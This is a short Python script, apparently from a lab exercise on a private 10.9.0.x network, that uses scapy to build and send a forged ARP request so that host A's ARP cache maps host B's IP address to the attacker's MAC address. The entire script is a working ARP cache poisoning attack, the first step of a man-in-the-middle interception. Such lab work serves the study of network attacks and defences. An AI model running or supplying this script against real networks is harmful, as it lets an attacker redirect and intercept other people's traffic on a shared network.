#!/usr/bin/python3

from scapy.all import *
B_IP = "10.9.0.6"
M_MAC = "02:42:0a:09:00:69"
A_IP = "10.9.0.5"
A_MAC = "02:42:0a:09:00:05"

print("SENDING SPOOFED ARP REQUEST TO POISON A's ARP CACHE......")
E = Ether()
E.dst = A_MAC
E.src = M_MAC

ARP = ARP()
ARP.psrc = B_IP
ARP.hwsrc = M_MAC
ARP.pdst = A_IP
ARP.op = 1
frame = E/ARP
sendp(frame)